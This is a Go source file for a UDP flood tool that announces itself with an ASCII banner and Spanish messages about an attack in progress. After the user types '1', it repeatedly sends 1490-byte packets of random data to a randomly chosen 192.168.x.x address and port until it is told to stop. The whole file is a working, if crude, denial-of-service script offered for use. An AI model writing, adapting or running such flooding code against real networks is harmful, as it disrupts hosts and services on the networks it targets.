package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"
)

func getRandomIP(randGen *rand.Rand) string {
	ip := fmt.Sprintf("192.168.%d.%d", randGen.Intn(256), randGen.Intn(256))
	return ip
}

func getRandomPort(randGen *rand.Rand) int {
	return randGen.Intn(65535-1) + 1
}

func flood(target string, port int, quit chan bool, randGen *rand.Rand) {
	for {
		select {
		case <-quit:
			return
		default:

			packet := make([]byte, 1490)
			randGen.Read(packet)

			// Abre una conexión UDP
			conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
			if err != nil {

				fmt.Println("Desconectando red...")
				continue
			}
			defer conn.Close()

			_, err = conn.Write(packet)
			if err != nil {

				fmt.Println("Desconectando red...")
			}

			// Imprimir el progreso de las peticiones
			fmt.Println("Desconectando red...")
		}
	}
}

func printBanner() {
	fmt.Println(`
_____  _             _____               _       _     _             
|_   _|(_)           |  __ \             | |     | |   (_)            
  | |   _  ___ _ __  | |  | | __ _ _ __  | | ___ | |__  _ _ __   __ _ 
  | |  | |/ _ \ '_ \ | |  | |/ _' | '_ \ | |/ _ \| '_ \| | '_ \ / _' |
 _| |_ | |  __/ | | || |__| | (_| | | | || | (_) | | | | | | | | (_| |
|_____|/ |\___|_| |_||_____/ \__,_|_| |_||_|\___/|_| |_|_|_| |_|\__, |
      |__/                                                     __/ |
                                                                 |___/ 
                                 By JuanThorRes

Negando red... (Ataque en curso)
`)
}

func main() {
	// Crear un nuevo generador de números aleatorios con una fuente de tiempo
	randGen := rand.New(rand.NewSource(time.Now().UnixNano()))

	printBanner()

	target := getRandomIP(randGen)

	port := getRandomPort(randGen)

	// Crear canal para controlar la interrupción del ataque
	quit := make(chan bool)

	var command string
	for {
		fmt.Print("\nEscribe '1' para iniciar el ataque o 'Ctrl + C' para detenerlo: ")
		fmt.Scanln(&command)

		if command == "1" {
			// Iniciar el ataque en una goroutine
			go flood(target, port, quit, randGen)

			// Esperar a que el usuario desee detener el ataque
			for {
				fmt.Print("\nEscribe '1' para detener el ataque: ")
				fmt.Scanln(&command)

				if command == "1" {
					// Enviar señal de interrupción para detener el ataque
					quit <- true
					close(quit)
					fmt.Println("Ataque detenido. Saliendo...")
					break
				}
			}
			break
		}
	}

	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	<-sigs
	fmt.Println("Ataque detenido por señal de interrupción.")
}
